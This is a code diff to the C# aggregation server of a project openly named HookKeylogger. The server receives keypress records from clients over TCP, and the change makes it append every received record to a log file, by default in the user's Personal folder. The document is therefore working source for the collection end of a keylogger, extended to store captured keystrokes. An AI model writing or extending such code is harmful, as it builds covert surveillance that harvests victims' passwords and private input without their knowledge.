@@ -4,6 +4,7 @@ using System.Net.Sockets;
 using HookKeylogger.Base;
 using System.IO;
 using HookKeylogger.AggergationServer.Types;
+using Google.Protobuf;
 
 namespace HookKeylogger.AggergationServer
 {
@@ -12,8 +13,16 @@ namespace HookKeylogger.AggergationServer
         ///<summary>
         ///Starts the listener for the server.
         ///</summary>
-        public static void Main()
+        public static void Main(string[] args)
         {
+            string foutname;
+            if (args.Length < 1)
+                foutname = Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\log";
+            else
+            {
+                foutname = args[0];
+            }
+            BufferedStream outbuffer = new BufferedStream(new FileStream(foutname, FileMode.Append));
             TcpListener server = null;
             try
             {
@@ -54,6 +63,8 @@ namespace HookKeylogger.AggergationServer
                         {
                             kp = CI.Parser.ParseDelimitedFrom(stream);
                             Console.WriteLine("Received: {0}", kp);
+                            kp.WriteDelimitedTo(outbuffer);
+                            outbuffer.Flush();
                         }
                         catch (IOException)
                         {
@@ -62,6 +73,7 @@ namespace HookKeylogger.AggergationServer
                     }
 
                     // Shutdown and end connection
+                    outbuffer.Flush();
                     client.Close();
                 }
             }
